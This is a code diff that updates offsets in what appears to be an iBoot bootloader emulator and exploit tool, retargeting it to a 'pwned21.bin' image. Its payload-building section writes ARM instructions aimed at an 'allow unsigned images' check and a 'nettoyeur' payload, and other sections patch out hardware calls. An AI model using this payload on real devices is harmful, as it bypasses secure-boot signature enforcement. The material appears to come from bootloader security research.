@@ -1,4 +1,4 @@
-#define IMAGE_NAME              "iBoot.k93ap.RELEASE.dec"
+#define IMAGE_NAME              "pwned21.bin"
 #define IMAGE_START             0x9FF00000
 #define IMAGE_END               0x9FF4CCB4
 #define IMAGE_SIZE              (IMAGE_END - IMAGE_START)
@@ -10,41 +10,41 @@
 #define IMAGE_HUGECHUNK         0x3000000
 
 
-#define breakpoint1_ADDR        (0x18D38 + 1) /* ResolvePathToCatalogEntry */
+#define breakpoint1_ADDR        (0x18D44 + 1) /* ResolvePathToCatalogEntry */
 
-#define fuck1_ADDR              (0x19B9A + 1)
-#define fuck2_ADDR              (0x19BB0 + 1)
-#define fuck3_ADDR              (0x19CC6 + 1)
+#define fuck1_ADDR              (0x19BA6 + 1)
+#define fuck2_ADDR              (0x19BBC + 1)
+#define fuck3_ADDR              (0x19CD2 + 1)
 
 #define wait_for_event_ADDR     (0x00814)
 #define hugechunk_ADDR          (0x00CAE + 1)
-#define gpio_pin_state_ADDR     (0x02C24 + 1)
-#define gpio_set_state_ADDR     (0x02C44 + 1)
-#define get_timer_us_ADDR       (0x01810 + 1)
-#define reset_cpu_ADDR          (0x01864 + 1)
-#define readp_ADDR              (0x19960 + 1)
-#define get_mem_size_ADDR       (0x1F478 + 1)
-#define putchar_ADDR            (0x35FC8 + 1)
-#define adjust_stack_ADDR       (0x1EBB4 + 1)
-#define adjust_environ_ADDR     (0x1F0B0 + 1)
-#define disable_interrupts_ADDR (0x36D04 + 1)
-#define cache_stuff_ADDR        (0x21E04 + 1)
-#define wtf_ADDR                (0x01740 + 1)
+#define gpio_pin_state_ADDR     (0x02C2C + 1)
+#define gpio_set_state_ADDR     (0x02C4C + 1)
+#define get_timer_us_ADDR       (0x01818 + 1)
+#define reset_cpu_ADDR          (0x0186C + 1)
+#define readp_ADDR              (0x1996C + 1)
+#define get_mem_size_ADDR       (0x1F48C + 1)
+#define putchar_ADDR            (0x35FD8 + 1)
+#define adjust_stack_ADDR       (0x1EBC8 + 1)
+#define adjust_environ_ADDR     (0x1F0C4 + 1)
+#define disable_interrupts_ADDR (0x36D14 + 1)
+#define cache_stuff_ADDR        (0x21E18 + 1)
+#define wtf_ADDR                (0x01748 + 1)
 
 #define iboot_warmup_ADDR       (0x00110)
 #define iboot_start_ADDR        (0x00BD0 + 1)
 #define main_task_ADDR          (0x00C3C + 1)
-#define panic_ADDR              (0x20520 + 1)
-#define system_init_ADDR        (0x2060C + 1)
-#define task_create_ADDR        (0x20C3C + 1)
-#define task_start_ADDR         (0x20D9C + 1)
-#define task_exit_ADDR          (0x20DC0 + 1)
-#define printf_ADDR             (0x35830 + 1)
-#define malloc_ADDR             (0x1997C + 1)
-#define free_ADDR               (0x19A30 + 1)
-#define create_envvar_ADDR      (0x182A0 + 1)
-#define bcopy_ADDR              (0x362B4)
-#define decompress_lzss_ADDR    (0x24FE0 + 1)
+#define panic_ADDR              (0x20534 + 1)
+#define system_init_ADDR        (0x20620 + 1)
+#define task_create_ADDR        (0x20C50 + 1)
+#define task_start_ADDR         (0x20DB0 + 1)
+#define task_exit_ADDR          (0x20DD4 + 1)
+#define printf_ADDR             (0x35840 + 1)
+#define malloc_ADDR             (0x19988 + 1)
+#define free_ADDR               (0x19A3C + 1)
+#define create_envvar_ADDR      (0x182AC + 1)
+#define bcopy_ADDR              (0x362C4)
+#define decompress_lzss_ADDR    (0x24FF0 + 1)
 
 
 void NAKED
@@ -349,7 +349,7 @@ if (1) {
             PUT_WORD_LE(buffer,  0x4A308 +  44 - 0x4A2B4, INSNT_LDR_R_PC(0, 56));
             PUT_WORD_LE(buffer,  0x4A308 +  46 - 0x4A2B4, INSNT_LDR_R_PC(1, 60));
             PUT_WORD_LE(buffer,  0x4A308 +  48 - 0x4A2B4, INSNT_STR_R1_R4_R0);
-            PUT_DWORD_LE(buffer, 0x4A308 +  50 - 0x4A2B4, make_bl(0, 0x4A308 + 50, 0x20C30));
+            PUT_DWORD_LE(buffer, 0x4A308 +  50 - 0x4A2B4, make_bl(0, 0x4A308 + 50, 0x20C44));
             PUT_WORD_LE(buffer,  0x4A308 +  54 - 0x4A2B4, INSNT_MOV_R_I(1, 0));
             PUT_WORD_LE(buffer,  0x4A308 +  56 - 0x4A2B4, INSNT_STR_R1_R0_68);
             PUT_WORD_LE(buffer,  0x4A308 +  58 - 0x4A2B4, INSNT_LDR_R_PC(0, 52));
@@ -368,7 +368,7 @@ if (1) {
             PUT_DWORD_LE(buffer, 0x4A308 +  92 - 0x4A2B4, (uintptr_t)image /* 0x9FF00000 */);
             PUT_DWORD_LE(buffer, 0x4A308 +  96 - 0x4A2B4, IMAGE_BSS_START - IMAGE_START);
             PUT_DWORD_LE(buffer, 0x4A308 + 100 - 0x4A2B4, 0x43B48 /* go command handler */);
-            PUT_DWORD_LE(buffer, 0x4A308 + 104 - 0x4A2B4, 0x1A5D8 /* allow unsigned images */);
+            PUT_DWORD_LE(buffer, 0x4A308 + 104 - 0x4A2B4, 0x1A5E4 /* allow unsigned images */);
             PUT_DWORD_LE(buffer, 0x4A308 + 108 - 0x4A2B4, INSN2_MOV_R0_0__STR_R0_R3 /* allow unsigned images */);
             PUT_DWORD_LE(buffer, 0x4A308 + 112 - 0x4A2B4, (uintptr_t)image + 0x4B000 /* nettoyeur uncompressed */);
             PUT_DWORD_LE(buffer, 0x4A308 + 116 - 0x4A2B4, (uintptr_t)image + 0x4A1DC /* nettoyeur compressed */);
@@ -525,13 +525,13 @@ dispatch_SEGV(void *si_addr, _STRUCT_ARM_THREAD_STATE *tctx)
     const struct mmreg *m;
 
     if (si_addr == 0) {
-        if (tctx->__pc == (uintptr_t)(image + 0x20A4E)) {
+        if (tctx->__pc == (uintptr_t)(image + 0x20A62)) {
             /* idle task crap (read from *0) */
             tctx->__r[0] = *(uint32_t *)(image);
             tctx->__pc += 2;
             return 0;
         }
-        if (tctx->__pc == (uintptr_t)(image + 0x20CAE)) {
+        if (tctx->__pc == (uintptr_t)(image + 0x20CC2)) {
             tctx->__r[1] = *(uint32_t *)(image);
             tctx->__pc += 2;
             return 0;
@@ -635,22 +635,22 @@ patch_image(unsigned char *image)
     /* jump directly to warmup */
     *image = (iboot_warmup_ADDR - 8) / 4;
     /* heap hardcoded offset */
-    *(uint32_t *)(image + 0x20618) = INSN2_LDR_R1_PC__B_PLUS4;
-    *(void **)(image + 0x2061C) = XLAT(IMAGE_END + IMAGE_HEAP_SIZE);
+    *(uint32_t *)(image + 0x2062C) = INSN2_LDR_R1_PC__B_PLUS4;
+    *(void **)(image + 0x20630) = XLAT(IMAGE_END + IMAGE_HEAP_SIZE);
     /* clean data cache */
-    *(uint32_t *)(image + 0x21A08) = INSNA_RETURN;
+    *(uint32_t *)(image + 0x21A1C) = INSNA_RETURN;
 #if !USE_SIGNAL
     /* idle task crap (read from *0) */
-    *(uint16_t *)(image + 0x20A4E) = INSNT_NOP;
-    *(uint16_t *)(image + 0x20CAE) = INSNT_MOV_R_R(1, 0);
+    *(uint16_t *)(image + 0x20A62) = INSNT_NOP;
+    *(uint16_t *)(image + 0x20CC2) = INSNT_MOV_R_R(1, 0);
 #endif /* !USE_SIGNAL */
     /* timer 2 */
-    *(uint32_t *)(image + 0x1FDC4) = INSN2_RETURN_0;
+    *(uint32_t *)(image + 0x1FDD8) = INSN2_RETURN_0;
     /* task switch FPU */
-    *(uint32_t *)(image + 0x21E38) = INSNA_MOV_R2_0;
-    *(uint32_t *)(image + 0x21E68) = INSNA_MOV_R2_0;
+    *(uint32_t *)(image + 0x21E4C) = INSNA_MOV_R2_0;
+    *(uint32_t *)(image + 0x21E7C) = INSNA_MOV_R2_0;
     /* bzero during mmu_init */
-    *(uint32_t *)(image + 0x211E8) = INSN2_NOP__NOP;
+    *(uint32_t *)(image + 0x211FC) = INSN2_NOP__NOP;
     /* nop some calls during iboot_start */
     *(uint32_t *)(image + 0x00BD6) = INSN2_NOP__NOP;
 #if 0 /* adjust_stack */
@@ -667,7 +667,7 @@ patch_image(unsigned char *image)
 
     /* pretend we have nand device? */
     *(uint32_t *)(image + 0xA70) = INSN2_MOV_R0_1__MOV_R0_1;
-    *(uint32_t *)(image + 0x19596) = INSN2_MOV_R0_1__MOV_R0_1;
+    *(uint32_t *)(image + 0x195A2) = INSN2_MOV_R0_1__MOV_R0_1;
 
     /* make main_task show SP */
     *(uint16_t *)(image + 0xD94) = INSNT_MOV_R_R(1, 13);
@@ -677,21 +677,21 @@ patch_image(unsigned char *image)
     *(uint8_t *)(image + 0x370D0) = 'x';
 
     /* nop NAND */
-    *(uint32_t *)(image + 0x1EED8) = INSN2_NOP__NOP;
+    *(uint32_t *)(image + 0x1EEEC) = INSN2_NOP__NOP;
 
     /* nop some more hw */
-    *(uint32_t *)(image + 0x0BB40) = INSN2_RETURN_0;
-    *(uint32_t *)(image + 0x01768) = INSN2_RETURN_0;
-    *(uint32_t *)(image + 0x026D0) = INSN2_RETURN_0;
+    *(uint32_t *)(image + 0x0BB48) = INSN2_RETURN_0;
+    *(uint32_t *)(image + 0x01770) = INSN2_RETURN_0;
+    *(uint32_t *)(image + 0x026D8) = INSN2_RETURN_0;
     *(uint32_t *)(image + 0x00D60) = INSN2_NOP__NOP;
-    *(uint16_t *)(image + 0x0C174) = INSNT_NOP; /* XXX loop */
-    *(uint16_t *)(image + 0x1FF7E) = INSNT_NOP;
-    *(uint32_t *)(image + 0x1F2E0) = INSN2_RETURN_0;
-    *(uint32_t *)(image + 0x1F4E8) = INSN2_RETURN_0;
-    *(uint32_t *)(image + 0x1F508) = INSN2_RETURN_0;
-    *(uint32_t *)(image + 0x1F548) = INSN2_RETURN_0;
-    *(uint32_t *)(image + 0x1F560) = INSN2_RETURN_21;
-    *(uint32_t *)(image + 0x1F578) = INSN2_RETURN_0;
+    *(uint16_t *)(image + 0x0C17C) = INSNT_NOP; /* XXX loop */
+    *(uint16_t *)(image + 0x1FF92) = INSNT_NOP;
+    *(uint32_t *)(image + 0x1F2F4) = INSN2_RETURN_0;
+    *(uint32_t *)(image + 0x1F4FC) = INSN2_RETURN_0;
+    *(uint32_t *)(image + 0x1F51C) = INSN2_RETURN_0;
+    *(uint32_t *)(image + 0x1F55C) = INSN2_RETURN_0;
+    *(uint32_t *)(image + 0x1F574) = INSN2_RETURN_21;
+    *(uint32_t *)(image + 0x1F58C) = INSN2_RETURN_0;
 }
 
 
